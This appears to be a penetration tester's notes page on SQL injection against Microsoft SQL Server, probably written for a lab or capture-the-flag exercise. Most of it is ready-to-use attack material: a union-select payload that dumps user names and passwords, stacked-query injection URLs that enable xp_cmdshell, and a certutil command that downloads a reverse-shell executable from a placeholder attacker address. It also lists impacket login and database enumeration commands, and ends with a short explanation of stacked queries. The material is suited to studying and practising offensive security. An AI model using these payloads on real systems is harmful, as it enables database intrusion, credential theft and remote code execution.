# MSSQL

{% embed url="https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet" %}

{% code overflow="wrap" fullWidth="true" %}
```sql
https://portswigger.net/web-security/sql-injection/cheat-sheet 
https://perspectiverisk.com/mssql-practical-injection-cheat-sheet/
https://swisskyrepo.github.io/PayloadsAllTheThings/SQL%20Injection/MSSQL%20Injection/

' union select concat(name,0x20,pass),2 from users--
# We can try to read files or write files
https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/writefile_bulkinsert.sql
```
{% endcode %}

##

{% code overflow="wrap" fullWidth="true" %}
```sql
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
EXEC xp_cmdshell 'whoami';

http://MACHINE_IP/giftresults.php?age='; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; --
http://MACHINE_IP/giftresults.php?age='; EXEC xp_cmdshell 'certutil -urlcache -f http://YOUR.IP.ADDRESS.HERE:8000/reverse.exe C:\Windows\Temp\reverse.exe'; --

impacket-mssqlclient Administrator:password@$IP -windows-auth
SELECT @@version;
SQL> SELECT name FROM sys.databases;
SQL> SELECT * FROM master.information_schema.tables;
SQL> select * from master.dbo.$TABLE;
SQL> select * from master.sys.sysusers;
SQL> select * from sysusers;
```
{% endcode %}

## Stacked Queries

SQL injection attacks can come in various forms. A technique that often gives an attacker a lot of control is known as a "stacked query". Stacked queries enable attackers to terminate the original (intended) query and execute additional SQL statements in a single injection, potentially leading to more severe consequences such as data modification and calls to stored procedures or functions.

It is also possible to manually enable **xp\_cmdshell** in SQL Server through `EXECUTE` (**EXEC**) queries. Still, it requires the database user to be a member of the **sysadmin** fixed server role or have the `ALTER SETTINGS` server-level permission to execute this command. However, as mentioned previously, misconfigurations that allow this execution are not too uncommon.
